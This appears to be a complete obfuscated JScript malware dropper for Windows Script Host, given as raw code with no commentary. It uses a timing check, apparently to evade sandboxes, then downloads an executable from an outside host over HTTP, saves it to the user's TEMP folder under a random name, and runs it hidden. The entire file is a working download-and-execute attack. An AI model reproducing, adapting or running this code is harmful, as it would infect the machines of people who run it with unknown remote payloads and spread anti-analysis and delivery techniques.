var B = false;
var N = "CreateObject";
var G = function a() {return WScript[N]("WScript.Shell");}(), D0 = 11;
var C = "MSXML2.XMLHTTP";
var J0 = 2123213;
var R = 0;
function D(O){G["Run"](O, R, R);};
function HI(){return "" + C;};
function iV(dE, TH){R = R * 1; return dE - TH;};
function lH(){return N;};
/*@cc_on
  @if (@_win32 || @_win64)
    B = true;
  @end
@*/
if (B)
{
var l0 = "";
function JQ(){return 22;};
var w = 0; var n = 0;
function a0()
{
var R1 = new this["Date"]();
var zx = R1["getUTCMilliseconds"]();
WScript["Sleep"](JQ());
var R1 = new this["Date"]();
var Y = R1["getUTCMilliseconds"]();
WScript["Sleep"](JQ());
var R1 = new this["Date"]();
var y = R1["getUTCMilliseconds"]();
var w = "l1";
w = iV(Y, zx);
var n = "R0";
n = iV(y, Y);
l0 = "open";
return iV(w, n);
}
var k = false;
var SA = false;
for (var W = R; W < JQ() * 1; W++){if (a0() != R){
k = true; 
n = "31" + 11 * w + n; 
SA = true; 
break;
}}
function Rd() {return ((k == true) && (k == SA)) ? 1 : R;};
if (k && Rd() && SA){
function l() {return G["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "RwqlPUlYpV.exe";};
 NR = HI();
 bP = WScript[N](NR);
 var J = 1;
 while (J){
try {
bP[l0]("GET", "http://kingsstaging.consines.in/l9osaw", false);
bP["send"]();
x = "Sleep";
for (;;){WScript[x](JQ() * 11); if (bP["readystate"] >= 2 * 2) break;};
J = R;
} catch(RH){};
}
function f(ZY) {var Kl = (1, 2, 3, 4, 5, ZY); return Kl;};
H = WScript[lH()]("ADODB.Stream");
NR = H;
NR[l0]();
NR["type"] = f(1);
NR["write"](bP["ResponseBody"]);
H["position"] = f(R);
NR["Save" + "ToFile"](l(), 2);
H["c"+"lose"]();
DU = l();
D(DU);
}
}

